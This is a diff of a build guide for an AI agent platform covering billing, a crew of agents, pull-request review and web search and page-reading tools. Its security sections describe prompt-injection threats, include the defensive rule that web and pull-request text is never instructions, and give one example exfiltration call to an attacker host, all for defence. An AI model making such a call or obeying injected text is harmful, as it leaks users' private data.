@@ -2,7 +2,7 @@
 
 What the MVP had to do, how it was designed, what we built, the tech used, and how every part works.
 
-- **Date:** 2026-09-28. **Updated:** 2026-10-03 with the launch basics (`docs/launch-plan.md`, package W1a)
+- **Date:** 2026-09-28. **Updated:** 2026-10-03 with the launch basics (`docs/launch-plan.md`, package W1a), and 2026-10-04 with the crew package (W2b-1): the crew list and progress lines, pull-request review, Scout's `web_search` and `read_page`, choosing Textcrew AI, and browser time split from paid tools in usage
 - **Code:** branch `mvp-build` in `beckend/` (TypeScript api + worker) and `vm-manager/` (Go + the agent image)
 - **Design source:** `docs/mvp-hld.md`
 - **Contracts:** `openapi/openapi.yaml` (REST + webhooks), `../vm-manager/proto/vm/v1/vm.proto` (gRPC)
@@ -29,11 +29,11 @@ What the MVP had to do, how it was designed, what we built, the tech used, and h
 
 | | |
 |---|---|
-| **Build phases (HLD §9)** | All 8 coded and committed (0 foundations → 8 hardening), plus later changes: a waitlist API, the 2026-09-29 pricing update (Max $30, automations 1/5/50, 90-day credits, waitlist discount), bring your own Claude plan (Claude Code runtime, 2026-09-30), and the **launch basics of 2026-10-03**: the channels switch (Telegram and web on, WhatsApp and iMessage off), 1 credit per app action that changes something, the connection check job, no purchase links on Telegram, and `/mcp` and `/git` closed at Caddy (§11) |
-| **Backend tests** | 32 files, 281 tests, all passing (run on 2026-10-03): real Postgres + real Redis, fakes for outside services |
-| **vm-manager tests** | Go unit tests (fake Docker daemon, store on embedded Postgres, `-race` clean) + 54 Bridge (Python) tests with a fake Hermes and a fake `claude` CLI, all passing |
+| **Build phases (HLD §9)** | All 8 coded and committed (0 foundations → 8 hardening), plus later changes: a waitlist API, the 2026-09-29 pricing update (Max $30, automations 1/5/50, 90-day credits, waitlist discount), bring your own Claude plan (Claude Code runtime, 2026-09-30), and the **launch basics of 2026-10-03**: the channels switch (Telegram and web on, WhatsApp and iMessage off), 1 credit per app action that changes something, the connection check job, no purchase links on Telegram, and `/mcp` and `/git` closed at Caddy (§11). Then the **crew package of 2026-10-04**: the crew list, crew progress lines in web chat, pull-request review per repo, Scout's `web_search` and `read_page`, choosing Textcrew AI over an own key or Claude plan, browser time as its own usage number, browser use in Max's features (§6.19 to §6.21) |
+| **Backend tests** | 36 files, 347 tests, all passing (run on 2026-10-04): real Postgres + real Redis, fakes for outside services |
+| **vm-manager tests** | Go unit tests (fake Docker daemon, store on embedded Postgres, `-race` clean) + 87 Bridge (Python) tests with a fake Hermes and a fake `claude` CLI. The numbers are from the agent-image package (W2b-2, 2026-10-04); they were not re-run for this guide |
 | **Contract coverage** | Every operation in `openapi.yaml` is implemented (a test enforces it) |
-| **Run for real?** | **Partly.** Docker isn't installed on the dev machine. A test deployment ran on AWS on 2026-09-30 and 2026-10-01 (`docs/aws-setup.md`): Telegram, Claude Code on a Claude plan, Composio, Caddy and Squid ran for real. That server is stopped now. The launch basics of 2026-10-03 have not run there, and WhatsApp, Sendblue, Polar, Jev and a platform model key have never run for real |
+| **Run for real?** | **Partly.** Docker isn't installed on the dev machine. A test deployment ran on AWS on 2026-09-30 and 2026-10-01 (`docs/aws-setup.md`): Telegram, Claude Code on a Claude plan, Composio, Caddy and Squid ran for real. That server is stopped now. The launch basics of 2026-10-03 and the crew package of 2026-10-04 have not run there, and WhatsApp, Sendblue, Polar, Jev and a platform model key have never run for real |
 | **Verdict** | **Code-complete, not end-to-end verified.** Section 12 lists the steps to verify it on a Docker machine |
 
 ---
@@ -52,15 +52,18 @@ This is what HLD sections 0, 5 and 7 ask the product to do.
 | F4 | **Real work in apps** | About 25 apps through Composio, plus the user's own MCP servers (Max plan) |
 | F5 | **Ask before risky actions** | Approvals for sending to others, deleting, paying; they never block the agent (✅/❌ comes back later as a new message) |
 | F6 | **Reminders and automations** | Once ("Friday 10am"), repeating ("every Monday 9am", in the user's timezone), app events ("when my boss emails me"); at most every 15 minutes |
-| F7 | **Credits billing** | 1 credit = $0.01 of price at ~2.5× real cost; AI, awake time, app actions that change something (1 credit each, since 2026-10-03), browser use and paid tools cost credits; reading and searching in apps are free; failed turns caused by us are free. Browser use is planned for launch on the Max plan and is not built yet |
+| F7 | **Credits billing** | 1 credit = $0.01 of price at ~2.5× real cost; AI, awake time, app actions that change something (1 credit each, since 2026-10-03), browser use and paid tools (the first one is web search, since 2026-10-04) cost credits; reading and searching in apps are free; failed turns caused by us are free. Browser use is planned for launch on the Max plan and is not built yet |
 | F8 | **Plans** (updated 2026-09-29 to match the pricing page) | Free $0 (100 sign-up credits, 10 apps, 1 automation), Pro $12 (1,500/month, 25 apps, 5 automations, top-ups), Max $30 (4,500/month, 25 apps + own MCP servers, 50 automations, priority when things get busy). **Every credit lasts 90 days from its grant**, whatever the source; unused monthly credits carry over. Model tiers are no longer advertised; the model limits stay in code and apply to Textcrew AI (F11) |
 | F9 | **Payments** | Polar checkout for plans and top-ups ($10 = 800 credits); webhooks decide plan changes; refunds and chargebacks; waitlist members get 50% off their first month of Pro or Max |
 | F10 | **Coupon codes** | Admin-created free credits with strict anti-abuse rules (HLD 7.7) |
-| F11 | **AI, three ways** | (1) The user's own API key (encrypted): the default and recommended way. (2) Their own Claude plan through Claude Code, labelled beta. (3) Textcrew AI: a rented model behind LiteLLM, paid in credits. With (1) and (2) the AI isn't charged in credits; awake time and app actions still are |
+| F11 | **AI, three ways** | (1) The user's own API key (encrypted): the default and recommended way. (2) Their own Claude plan through Claude Code, labelled beta. (3) Textcrew AI: a rented model behind LiteLLM, paid in credits. With (1) and (2) the AI isn't charged in credits; awake time, app actions and paid tools still are. A user with a key or a Claude plan can still choose Textcrew AI, and switch back (2026-10-04) |
 | F12 | **Smart routing** | Jev decides simple (cheap-model reply, no container) / task (wake the agent) / spam |
 | F13 | **Media** | Voice, images and documents; voice is turned into text |
-| F14 | **Web app API** | Profile, channels, chat history + live updates, approvals, apps, MCP servers, automations, billing, credits, usage, coupons, activity log |
+| F14 | **Web app API** | Profile, channels, chat history + live updates, approvals, apps, MCP servers, automations, pull-request review per repo, agent settings, the crew list, billing, credits, usage, coupons, activity log |
 | F15 | **Admin** | Coupons, credit adjustments, free-credit spend, abuse flags, failed jobs (Bull Board) |
+| F16 | **The crew** (2026-10-03) | Tex leads; Byte codes, Patch reviews code, Scout researches. The specialists are defined in the agent image. The platform gives the apps the crew list and passes the crew's progress lines to web chat |
+| F17 | **Pull-request review** (2026-10-03) | Turned on per GitHub repo. A pull request is opened or gets new commits → Patch reviews it → one review on the pull request → a short verdict in chat. Once per head commit. Turning it on is the standing permission to comment on that repo's pull requests, and nothing else |
+| F18 | **Web research** (2026-10-03) | `web_search` (a paid tool) and `read_page` (free), run on the platform, never in the container. `read_page` reaches public addresses only, and only an address already seen for the user |
 
 ### 2.2 Non-functional requirements
 
@@ -144,11 +147,11 @@ flowchart LR
 | auth | users, Clerk, link codes, channel links (+ waitlist, added later) |
 | channels | WhatsApp / Telegram / Sendblue / web adapters, messages, media |
 | events | webhook intake, `events` table, queue producers |
-| orchestrator | per-user lock, Jev routing, wake → deliver flow, approvals, sandbox tokens |
-| platform-mcp | the MCP server agents call |
-| integrations | Composio, user MCP servers, bring-your-own keys |
+| orchestrator | per-user lock, Jev routing, wake → deliver flow, approvals, sandbox tokens, agent settings (which AI pays), the crew list and progress lines |
+| platform-mcp | the MCP server agents call, its tools, and the record of web addresses seen for each user |
+| integrations | Composio, user MCP servers, bring-your-own keys, the git gateway, the web page reader, the web search provider |
 | billing | plans, subscriptions, grants, ledger, coupons, Polar, LiteLLM keys |
-| automations | automation rows and timers |
+| automations | automation rows and timers, pull-request review (`pr_reviews`) |
 | admin | audit log, admin tools, metrics, alerts, backups |
 
 Rule: each module owns its tables and other modules use its exported functions, never its tables.
@@ -237,6 +240,7 @@ Rule: each module owns its tables and other modules use its exported functions, 
 | TypeSafe Jev | Message routing |
 | OpenRouter / Anthropic / OpenAI (via LiteLLM) | Models |
 | Polar | Plans, top-ups, refunds (merchant of record) |
+| Brave Search API | Scout's `web_search` (needs a key; $5 per 1,000 searches when checked on 2026-10-04) |
 | Off-server storage (e.g. Backblaze B2 via rclone) | Backups |
 
 ---
@@ -253,15 +257,18 @@ Status: ✅ built + tested (fakes for outside services) · ⚠️ built, needs a
 | F4 Apps + own MCP | 25-app catalog (10 on Free) through the Composio SDK; own MCP servers on Max with egress allowlist updates | ✅ / ⚠️ real Composio |
 | F5 Approvals | `request_approval` → buttons / yes-no / web; single use; must match the exact action and arguments | ✅ |
 | F6 Automations | once / repeat (cron + timezone) / app event; 15-min minimum; plan limits; auto-pause; survive restart + Redis wipe | ✅ |
-| F7 Credits | Grants + append-only ledger; spending order; charging every 5 min and after each turn; 1 credit per successful app action that changes something; reversal of our failures | ✅ |
+| F7 Credits | Grants + append-only ledger; spending order; charging every 5 min and after each turn; 1 credit per successful app action that changes something; paid tools at cost × 2.5 with fractions carried over; reversal of our failures | ✅ |
 | F8 Plans | Free $0 / Pro $12 / Max $30 with limits on apps (10/25/25), automations (1/5/50), own MCP (Max), top-ups (paid), queue priority; 90-day credits; model limits kept in code | ✅ |
 | F9 Payments | Polar checkout + 9 webhook event types, exactly once; waitlist discount applied automatically | ✅ / ⚠️ real Polar |
 | F10 Coupons | Every 7.7 rule, incl. 50 parallel redemptions on real Postgres | ✅ 🔁 |
-| F11 AI, three ways | Own key: encrypted, test-called before saving; AI not charged. Claude plan: sign-in in the container, runtime switch. Textcrew AI: Hermes on credits (`AI_ACCESS_MODE=platform`; `own_only` switches it off) | ✅ 🔁 / ⚠️ real Claude Code, no platform model key yet |
+| F11 AI, three ways | Own key: encrypted, test-called before saving; AI not charged. Claude plan: sign-in in the container, runtime switch. Textcrew AI: Hermes on credits (`AI_ACCESS_MODE=platform`; `own_only` switches it off). `aiPreference: platform` chooses Textcrew AI over an own key or Claude plan | ✅ 🔁 / ⚠️ real Claude Code, no platform model key yet |
 | F12 Jev routing | Real SDK; fallback to "task" on any doubt or failure | ✅ / ⚠️ real Jev |
 | F13 Media | Download per channel, voice → text via LiteLLM | ✅ / ⚠️ |
-| F14 Web API | All 56 operations in the spec | ✅ |
+| F14 Web API | All 60 operations in the spec | ✅ |
 | F15 Admin | Coupons, credit adjustments, free-credit stats + abuse flags, Bull Board, waitlist admin | ✅ |
+| F16 The crew | `GET /v1/crew` (Tex, Byte, Patch, Scout; `CREW_AVAILABLE` says which specialists are on; Scout's browser needs Max and is not built). Progress lines → SSE `agent.progress`, crew lines also in the activity log, nothing to Telegram | ✅ / ⚠️ never run against the real Bridge |
+| F17 Pull-request review | `PUT` / `DELETE /v1/pr-reviews/{owner}/{repo}`, `GET /v1/pr-reviews`; an event automation with the preset `pr_review`; one review per head commit (`pr_reviews`); a standing approval for four named GitHub actions on that repo | ✅ / ⚠️ real Composio trigger and action names |
+| F18 Web research | `web_search` behind a provider interface (Brave built), charged through the ledger; `read_page` with address checks at every hop, a pinned connection, limits, and the seen-address rule | ✅ / ⚠️ no search key yet, never run against the real internet |
 | N1 Isolation | gVisor spec, limits, read-only, sandbox network, Squid allowlist | ⚠️ (no disk quota by default 🔁) |
 | N2 No impersonation | `/mcp` maps sha256(token) → user; tools never read a user id | ✅ |
 | N3 No platform keys in containers | Only the user's LiteLLM key, MCP token, Bridge secret | ✅ |
@@ -274,6 +281,7 @@ Status: ✅ built + tested (fakes for outside services) · ⚠️ built, needs a
 | N10 Ops | Nightly backup job, restore-test script, `/metrics`, alerts, per-IP rate limits, load-test script | ✅ job logic / ⚠️ scripts not run |
 | Extra | Waitlist API with IP + request data for abuse monitoring | ✅ |
 | Extra | Launch basics (2026-10-03): channels switch, app-action charge, connection check job, no purchase links on Telegram, `/mcp` and `/git` closed at Caddy | ✅ / ⚠️ the Caddy rule is untested live |
+| Extra | API gaps found by the web app (2026-10-04): `platformAvailable` and `aiPreference` in the agent settings, `browserCredits` apart from `toolCredits` in usage, `limits.browser` and a browser line in Max's features | ✅ |
 
 ---
 
@@ -434,12 +442,12 @@ Step by step (`orchestrator/process-message.ts` → `turn.ts`):
 
 - **Transport:** MCP streamable HTTP, **stateless**: each request gets a new server bound to one user.
 - **Auth:** `Authorization: Bearer <container token>` → sha256 → `sandbox_tokens` → user id. Unknown token → `401`. The limit is 240 calls per minute per user.
-- **Every tool call** refreshes the container's last-active time (`Touch`) and writes an audit entry (actor `agent`, with secrets redacted from the arguments).
+- **Every tool call** refreshes the container's last-active time (`Touch`) and writes an audit entry (actor `agent`, with secrets redacted from the arguments). A tool can say what the audit entry keeps of its arguments: `read_page` keeps the address without its query string.
 - **Tool errors** go back to the agent as `isError` text. Internal errors show only "Internal error".
 - **`/mcp/files/<id>?exp&sig`** serves attachments with an HMAC-signed, 1-hour URL. It lives under `/mcp` because that's the only api path the egress proxy lets containers reach.
 - **Closed to the internet.** Caddy answers 404 for `/mcp*`. Containers call `http://api:8080/mcp` directly through the egress proxy, and the attachment URLs are built from `INTERNAL_API_URL`, so nothing public uses this path.
 
-The 9 tools are listed in §8.3.
+The 11 tools are listed in §8.3.
 
 **Git gateway (`/git/<owner>/<repo>`).** Real git for the user's GitHub, without a GitHub token in the container (`src/api/git.ts`, `src/modules/integrations/git-gateway.ts`, HLD §5.1).
 
@@ -464,11 +472,12 @@ The 9 tools are listed in §8.3.
 4. `scripts/dev-user.ts status` asks Composio before it prints the apps.
 
 **Running an action:**
-- `list_app_actions` shows only actions of apps the user has connected **and** their plan allows. Each action is marked `requires_approval` when its name contains SEND, DELETE, PAY, SHARE, POST, MERGE and similar words.
+- `list_app_actions` shows only actions of apps the user has connected **and** their plan allows. Each action is marked `requires_approval` when its name contains SEND, DELETE, PAY, SHARE, POST, MERGE and similar words, and, since 2026-10-04, when it is a GitHub action that writes a comment or a review (other people read those).
 - `run_app_action` always calls Composio with the **caller's** user id and connected account. Risky actions need an `approval_id` that is:
   - approved, and decided less than 24 hours ago,
   - not used yet (it is consumed atomically),
   - for the same action, and with **exactly the same arguments** the user approved.
+- **One exception:** a new review or comment on a pull request, in a repo where the user turned pull-request review on, runs without an approval (§6.20).
 - If Composio fails, the approval is released so it can be retried.
 - **The charge (HLD §7.2):** a successful action that changes something costs 1 credit; reading is free; a failed action costs nothing. At zero credits a changing action is refused before it reaches Composio. Details in §6.10.
 - **What changes something** (`integrations/catalog.ts`, built on the risky-action check, by the words in the action's name):
@@ -512,10 +521,10 @@ The 9 tools are listed in §8.3.
 4. Credits:
    - AI: cost × 2.5 × 100, rounded up
    - awake time: 1 credit per 600 s
-   - browser time: 1 credit per 30 s (browser use is planned for launch on the Max plan and is not built yet, so this is always 0 today)
+   - browser time: 1 credit per 30 s (browser use is planned for launch on the Max plan and is not built yet, so this is always 0 today). Since 2026-10-04 it is saved as its own number (`usage_periods.browser_credits`); before, it shared `tool_credits` with paid tools
    - leftover seconds carry over to the next sync
 5. The result is **one** charge with the key `usage:<user>:<period start>`, so a re-run can't charge twice. A window with no usage writes nothing.
-6. BYOK users aren't charged for AI; awake time still counts.
+6. BYOK users aren't charged for AI; awake time still counts. A BYOK user who chose Textcrew AI (`aiPreference: platform`, §6.13) is charged for AI like anyone else.
 
 **App actions** (`billing/app-actions.ts`) are charged when they run, not by the sync:
 - `run_app_action` charges 1 credit after Composio reports success, through the same grants and ledger (`spendInTx`), as one ledger row with the description `App action: <NAME>` and `meta.kind = app_action`.
@@ -525,16 +534,27 @@ The 9 tools are listed in §8.3.
 - **Where the user sees it:** the credit history (`GET /v1/credits/ledger`), the activity log (`creditsCharged` on the `run_app_action` entry: 1, or 0 for a read), and usage (`appActionCredits` per period and in the totals of `GET /v1/usage`, read back from the ledger and counted in `totalCredits`).
 - If the last credit goes, the LiteLLM budget is closed and automations pause, as after a sync.
 
+**Paid tools** (`billing/paid-tools.ts`, 2026-10-04) are charged when they run too. The first one is Scout's `web_search`:
+- **The price is the tool's real cost × 2.5.** One search costs us $0.005 (`WEB_SEARCH_COST_USD`), so it is 1.25 credits.
+- **Fractions carry over.** Each charge is one ledger row (`Web search`, `meta.kind = paid_tool`) that also saves what the call cost (`meta.costMicroUsd`). The next charge adds up the user's earlier rows under the credit lock, and charges what the total has reached in whole credits minus what was charged before, never less than 1. Four searches cost 1, 1, 1 and 2 credits: 5 in all. There is no separate counter.
+- **Idempotency key:** `paid-tool:<an id made for that call>`.
+- **Which grants pay:** normal grants only. A cheap-model-only coupon grant doesn't pay a paid tool (HLD §7.7).
+- **Only success is charged.** A search the provider fails, and a search with no provider set up, cost nothing. A cost of 0 is not charged.
+- **Where the user sees it:** the credit history, the activity log (`creditsCharged` on the `web_search` entry) and usage (`toolCredits`).
+- `billing/item-charges.ts` holds what app actions and paid tools share: reading such charges back from the ledger, per usage period, and giving them back after a failed turn.
+
+**Usage in five parts:** `GET /v1/usage` reports `aiCredits`, `awakeCredits`, `appActionCredits`, `browserCredits` and `toolCredits` per period and in the totals; `totalCredits` is their sum.
+
 **Enforcement:**
 | When | What happens |
 |---|---|
 | Before a turn | balance ≤ 0 → "out of credits" reply, no wake (web: `402`) |
 | During a turn | the LiteLLM key's `max_budget` = spend so far + balance ÷ 250 dollars, so LiteLLM refuses once the credits run out (BYOK users: no AI cap while the balance is above 0) |
-| Before an app action that changes something | balance ≤ 0 → the tool tells the agent the user is out of credits (and to point them to the web app, without a link); the action doesn't run. Reading still works |
+| Before an app action that changes something, or a paid tool | balance ≤ 0 → the tool tells the agent the user is out of credits (and to point them to the web app, without a link); the action or search doesn't run. Reading still works |
 | Balance hits ≤ 0 | budget set to spend so far; `onBalanceDepleted` → all enabled automations paused (`out_of_credits`) |
 | Credits added | budget raised; `onCreditsAdded` → automations paused for credits resume; SSE `credits.updated` |
 
-**Failures caused by us:** if a turn ends with `platform_fault`, `reverseTurn` syncs first, works out the turn's cost from LiteLLM spend logs and `GetUsage` over the turn window, and gives back at most what was charged, to the grants it came from. The app-action credits charged between the turn's start and end are given back too, under their own reversal key (`reversal:<turn>:app-actions`); the per-user lock means every app action in that window belongs to the turn.
+**Failures caused by us:** if a turn ends with `platform_fault`, `reverseTurn` syncs first, works out the turn's cost from LiteLLM spend logs and `GetUsage` over the turn window, and gives back at most what was charged, to the grants it came from. The app-action credits charged between the turn's start and end are given back too, under their own reversal key (`reversal:<turn>:app-actions`); the per-user lock means every app action in that window belongs to the turn. Paid-tool credits charged in the turn are given back the same way (`reversal:<turn>:paid-tools`).
 
 **Expiry job:** the hourly `expire-credits` job expires grants past their date, and moves users whose cancelled plan has lapsed back to Free (their credits keep their own expiry), including a plan set to cancel at the period end if Polar's `subscription.revoked` never came.
 
@@ -605,7 +625,7 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
    - unknown login (or another user's) → `404`
 4. Success → `agent_settings.claude_connected_at` is set, runtime becomes `claude_code`, `SetAgentRuntime` is sent, audit `claude_connected`. Returns the settings.
 
-- `PATCH /v1/agent/settings { runtime }` switches between Hermes and Claude Code. Claude Code without a connected plan → `409`.
+- `PATCH /v1/agent/settings { runtime }` switches between Hermes and Claude Code. Claude Code without a connected plan → `409`. The same call takes `aiPreference` (below).
 - `DELETE /v1/agent/claude` → `ClaudeLogout` (removes Claude Code's credentials), clears the connection, back to Hermes, audit `claude_disconnected`. No container → still `204`.
 - New containers are created with the runtime from the settings (`CreateSandbox.runtime`).
 
@@ -613,6 +633,7 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
 
 | User has | Runs (`effectiveRuntime`) | Pays for AI (`aiAccess`) |
 |---|---|---|
+| chose Textcrew AI (`aiPreference: platform`), `AI_ACCESS_MODE=platform` | Hermes | `platform` (credits), whatever else they have |
 | a connected Claude plan and chose Claude Code | Claude Code | `claude_plan` |
 | an own API key | Hermes | `own_key` |
 | nothing, `AI_ACCESS_MODE=platform` | Hermes | `platform` (credits) |
@@ -620,6 +641,15 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
 | nothing, `AI_ACCESS_MODE=own_only` | nothing (`null`) | `none` |
 
 `AI_ACCESS_MODE` is `platform` by default: a user who brought nothing gets Textcrew AI (Hermes on credits). `own_only` switches Textcrew AI off: the user must bring their own AI.
+
+**Choosing Textcrew AI anyway** (2026-10-04, HLD §7.1):
+- `GET /v1/agent/settings` says whether Textcrew AI is on offer (`platformAvailable`, true when `AI_ACCESS_MODE=platform`) and what the user chose (`aiPreference`: `auto` or `platform`, saved in `agent_settings.ai_preference`, default `auto`).
+- `PATCH /v1/agent/settings { aiPreference: "platform" }` chooses Textcrew AI although a key is saved or a Claude plan is connected. Hermes runs, the AI is charged in credits, and the AI budget follows at once. The key and the Claude connection are kept, so `{ aiPreference: "auto" }` switches back with no new sign-in.
+- **`own_only`:** choosing `platform` is refused (`409`), and a choice saved earlier is ignored. The `own_only` rules are unchanged.
+- **Connecting a Claude plan** sets the choice back to `auto`.
+- A screen with three choices sends: own key → `{ runtime: "hermes", aiPreference: "auto" }`; Claude plan → `{ runtime: "claude_code", aiPreference: "auto" }`; Textcrew AI → `{ aiPreference: "platform" }`.
+- Billing asks one question, `ownKeyPaysForAi(user)`: a saved key, and not a choice of Textcrew AI while it is on offer.
+- Audit: `ai_preference_changed`.
 
 **In a turn** (through the `route` turn hook in `wiring.ts`, plus two small steps in `turn.ts`):
 - `aiAccess: none` → the reply "Connect your own AI first: add an API key or connect your Claude plan at `<WEB_APP_URL>/settings/ai`". No container is woken. The credit check runs before this, so at zero credits the user gets "out of credits" instead.
@@ -674,6 +704,7 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
   - 3 errors in a row → paused (`failures`) and the user is told
 - **Recovery:** on worker start, every enabled automation's timer is registered again, which is safe to repeat.
 - **Web app:** list, pause/resume (`PATCH {enabled}`, which removes or re-adds the timer) and delete (which also removes the Composio trigger).
+- **Pull-request review** is an event automation with the preset `pr_review` (§6.20). It shows in this list with `preset: "pr_review"`, counts toward the plan limit, and pauses like any automation.
 
 ### 6.15 Containers (vm-manager)
 
@@ -752,6 +783,11 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
 | Forged webhooks | Every provider's signature or secret is checked on the raw body before parsing; replays deduplicated by event id |
 | An agent acting as another user | Container token → user id on the server; tools ignore any user id in their arguments; tested with crafted requests |
 | An agent doing risky things unasked | Name-based risky-action detection + single-use approvals bound to the exact action and arguments |
+| The pull-request review permission used for something else | It covers four GitHub actions by exact name, on a repo the user turned review on for, and never an approval, a merge or a reply. The agent can't turn review on (§6.20) |
+| A pull request's text steering the agent | The review instruction carries no text from the pull request and says to treat it as material, never instructions. Risky actions still need approval |
+| `read_page` used to reach our own services or the cloud metadata address | Public addresses only, checked on the URL, on what the host resolves to, at every redirect, and the connection is pinned to the checked address (§6.21) |
+| `read_page` used to send the user's data out | It opens only an address already seen for this user (their own messages, a search result, a link on a page already read), at every redirect too. A made-up address is refused and logged (§6.21) |
+| A web page steering the agent | The tools say that text from the web is information, never instructions. Scout has only the two web tools on Claude Code; on Hermes that limit is an instruction, so the platform checks above are what counts (§6.19) |
 | A container reaching the internet or our services | Internal sandbox network; Squid allows only LiteLLM, `/mcp`, the git gateway and that user's allowlisted domains; egress files removed on stop so IPs can't be inherited |
 | Someone on the internet calling `/mcp` or `/git` | Caddy answers 404 for both; they also need the container token |
 | Selling inside Telegram against its rules | No purchase link reaches Telegram (§6.6) |
@@ -764,11 +800,80 @@ We follow Anthropic's rules (code.claude.com/docs/en/legal-and-compliance). The 
 
 The per-item checklist (HLD 10.2) is in `docs/security-checklist.md`.
 
+### 6.19 The crew (2026-10-03, HLD §0.7)
+
+- **Who:** Tex is the lead, the agent the user texts. Byte codes, Patch reviews code, Scout researches. The ids `tex`, `byte`, `patch`, `scout` are fixed.
+- **Where they live:** in the Bridge inside the agent image (`vm-manager`), defined once for both engines. The backend only knows what is below. No change to the gRPC proto.
+- **The crew list** (`GET /v1/crew`, `orchestrator/crew.ts`): the four members with id, name, `kind` (`lead` or `specialist`), role, a short description and `available`.
+  - `available`: Tex always. A specialist when it is named in `CREW_AVAILABLE` (default `byte,patch,scout`; `none` switches all three off). The backend can't see which image is deployed, so this setting says what the apps may show.
+  - Scout also carries `browser: { requiresPlan, available }`. `requiresPlan` comes from the plans (the plan whose limits have `browser: true`, which is Max). `available` is false: the browser is not built.
+- **Progress lines** (`orchestrator/turn.ts`): the Bridge reports progress during a turn as stream events with a text, for example `Scout: reading 4 pages` or `using web_search`.
+  - Every line goes to the web app's live stream as `agent.progress` (`text`, `crew`, `at`). `crew` is `byte`, `patch` or `scout` when the text starts with that name and a colon, otherwise null.
+  - **Nothing is sent to Telegram** or any other chat for a progress line. A chat only gets what the agent sends with `send_message`.
+  - A line that names a crew member is also saved to the activity log (`crew_progress`, with `crew`), at most 30 per turn. A line is cut at 300 characters. A failure here never fails the turn.
+- **Known limit on Hermes** (from the agent-image package): the pinned Hermes version has no tool list per delegated task. On Claude Code a specialist's tool list is enforced; on Hermes it is only an instruction. So Scout's "search and read only" holds by tools on Claude Code and by instruction on Hermes. The controls that hold on both engines are on the platform: approvals, and the seen-address rule of `read_page` (§6.21).
+
+### 6.20 Pull-request review (2026-10-03, HLD §0.8)
+
+**Turning it on and off** (`automations/pr-review.ts`):
+- `PUT /v1/pr-reviews/{owner}/{repo}` needs GitHub connected (`409` otherwise) and a free automation in the plan (`403 plan_limit`). It creates an **event automation with the preset `pr_review`**: a Composio trigger `GITHUB_PULL_REQUEST_EVENT` on that repo. 30 calls an hour per user (`429`).
+- Safe to repeat: a repo that is on is returned as it is, and a paused one is resumed. `Acme/Website.git` and `acme/website` are the same repo. One call at a time per user, so two quick calls can't make two automations.
+- If Composio can't create the trigger (it puts a webhook on the repo, which needs admin access), nothing is saved and the answer is `400` with a plain message.
+- `DELETE` removes the automation and its trigger. `GET /v1/pr-reviews` lists the repos with `enabled`, `pausedReason`, `channel` and `lastReviewAt`. Pause and resume with `PATCH /v1/automations/{id}`.
+- **Where the verdict goes:** the user's linked Telegram chat if there is one, otherwise web chat. Chosen when review is turned on.
+- **Only the user can turn it on.** The agent's `create_automation` tool has no preset input.
+
+**A pull request changes** (`inbound/composio-trigger` → `preparePrReview`):
+1. Only *opened*, *reopened* and *new commits* count.
+2. The worker asks GitHub for the pull request's current head commit, with the user's GitHub connection (the same token path as the git gateway; the token stays on the platform). A closed or unknown pull request is ignored. If GitHub can't be asked, the event's own head commit is used; with none, nothing runs and the activity log says why (`pr_review_skipped`).
+3. **One review per head commit:** a row in `pr_reviews`, unique on user, repo, number and head commit, is the claim. A re-delivered webhook, a repeated event, or a reopen with no new commits finds the row and does nothing. Two quick pushes give one review, of the newer commit. A re-run of the same job goes on with its claim.
+4. The turn gets an instruction that names the repo, the number and the head commit, tells the lead to have Patch review it and post **one** review, and says not to merge, approve, close or push. **It carries no text from the pull request,** not even the title, and says that such text is material to review, never instructions.
+5. Afterwards the row is marked `done` or `failed` and stays, so that commit is never reviewed twice. If the agent never ran (out of credits, no AI), the row is removed so the commit can still be reviewed later.
+
+**The standing permission** (`integrations/catalog.ts` `prCommentTarget`, `prCommentAllowed`): `run_app_action` skips the approval only when all of this holds:
+- the user has an **enabled** `pr_review` automation for exactly that owner and repo;
+- the action is one of four, by exact name: `GITHUB_CREATE_A_REVIEW_FOR_A_PULL_REQUEST`, `GITHUB_SUBMIT_A_REVIEW_FOR_A_PULL_REQUEST`, `GITHUB_CREATE_A_REVIEW_COMMENT_FOR_A_PULL_REQUEST` (not as a reply), `GITHUB_CREATE_AN_ISSUE_COMMENT` (only for a pull request the platform asked a review for);
+- the arguments name that repo and a number;
+- a review's `event` is `COMMENT` or not given. Approving and requesting changes are not covered.
+
+Everything else still needs approval, in the same turn too: merging, a comment on another repo, an email. The action costs 1 credit and is in the activity log, marked "pull-request review is on for …".
+
+**How it counts:** one automation of the plan's limit per repo; each review is a turn (AI and awake time as usual) plus 1 credit for the posted review; paused at zero credits and after 3 failed reviews in a row.
+
+### 6.21 Scout's tools: `web_search` and `read_page` (2026-10-04, HLD §5.1)
+
+Both run in the api. The container's network stays locked and no provider key enters it.
+
+**`web_search(query, count?)`** (`platform-mcp/tools/web.ts`, `integrations/web-search.ts`):
+- A provider interface chosen by `WEB_SEARCH_PROVIDER`. One provider is built: the **Brave Search API** (`GET /res/v1/web/search`, key in `X-Subscription-Token`).
+- **No key set:** the tool answers that search isn't set up. It is a normal answer, not an error, so the turn goes on. Nothing is charged.
+- 20 searches a minute per user; at most 10 results (default 5), each a title, a link and a snippet.
+- Refused at zero credits. Charged only on success, as a paid tool (§6.10).
+
+**`read_page(url)`** (`integrations/web-page.ts`): reads one public web page and returns its text and its first 50 links. Free. 30 pages a minute per user.
+- **The URL:** `http` or `https` only, ports 80 and 443, no user name or password. A host written as an address must be a public one. Names with no dot, `localhost`, `.local`, `.internal` and the platform's own hosts are refused.
+- **What the host resolves to:** refused if **any** of its addresses is private, loopback, link-local (the cloud metadata address), carrier NAT, multicast or reserved. For IPv6 only global addresses pass.
+- **Pinned connection:** the request connects to the address that passed the check, whatever the name resolves to a moment later (no DNS rebinding). The name is still what the certificate is checked against. Each request has its own connection.
+- **Redirects** are followed by hand, at most 5, and every hop goes through all the checks again.
+- **Limits:** 15 seconds in total; 2 MB; text types only (HTML, plain text, JSON, XML); 20,000 characters returned. The text extraction is one pass with no backtracking.
+- **What is sent:** a plain GET with a fixed user agent. No cookies, nothing about the user.
+
+**The seen-address rule** (`platform-mcp/seen-urls.ts`). `read_page` needs no approval, so it must not be a way to send data out: an injected instruction could otherwise make an agent call `read_page("https://attacker.example/?d=<private data>")`. So it opens only an address the platform has already seen for this user, by exact match after normalising:
+- **(a)** an address in the user's own messages (their last 100 from the past 7 days, on any chat). The agent's own messages, automation instructions and app events don't count;
